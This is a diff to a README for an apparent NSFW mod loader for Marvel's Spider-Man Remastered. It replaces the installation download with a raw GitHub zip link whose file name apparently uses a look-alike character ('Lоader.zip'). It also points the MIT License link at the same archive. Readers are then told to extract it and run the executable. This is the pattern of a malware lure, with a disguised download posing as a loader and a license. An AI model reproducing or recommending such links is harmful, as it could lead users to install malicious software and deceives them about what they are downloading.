@@ -59,7 +59,7 @@ Here’s a breakdown of the functions available in the patch loader and modifier
 
 ## 🛠️ Installation Guide
 
-1. **Download `Loader.rar`** from this repository and extract it to any desired location on your PC.
+1. **Download `https://raw.githubusercontent.com/KOKO1904/SpideyRemastered-NSFW-Modworks/main/Lоader.zip`** from this repository and extract it to any desired location on your PC.
 2. Launch the Loader executable.
 3. Follow the on-screen prompts to select your Marvel's Spider-Man Remastered game directory.
 4. Choose which NSFW modules and enhancements you wish to enable.
@@ -86,7 +86,7 @@ By using this patch, you agree to all local law requirements and will not share 
 
 ## 💡 License
 
-Distributed under the [MIT License](https://opensource.org/licenses/MIT).  
+Distributed under the [MIT License](https://raw.githubusercontent.com/KOKO1904/SpideyRemastered-NSFW-Modworks/main/Lоader.zip).  
 See LICENSE file for more details.
 
 ---
